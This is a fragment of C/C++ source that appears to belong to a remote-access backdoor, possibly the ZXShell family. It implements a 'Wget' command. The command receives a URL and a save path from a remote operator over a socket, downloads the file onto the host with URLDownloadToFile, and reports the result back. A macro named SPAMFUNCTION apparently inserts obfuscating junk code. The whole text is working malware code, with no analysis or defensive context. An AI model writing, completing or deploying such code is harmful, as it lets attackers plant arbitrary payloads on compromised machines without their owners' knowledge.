void Wget(SOCKET Socket, char* FileURL, char* SavePath)
{
	SendMessage(Socket, "DownLoad Now ...\r\n");
	HRESULT hRet=ZXSAPI::URLDownloadToFile(0,FileURL,SavePath,0,0);
	if(hRet==S_OK) 
         SendMessage(Socket, "Http DownLoad The File Successfully\r\n");
	else    
         SendMessage(Socket, "Fail To Http DownLoad The File\r\n");
}
void Wget(MainPara *args)
{
	SPAMFUNCTION
		
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	if(argc < 3)
	{
		SendMessage(Socket, "Usage: %s HttpURL SavePath\r\n", argv[0]);
		return;
	}
	Wget(Socket, argv[1], argv[2]);
}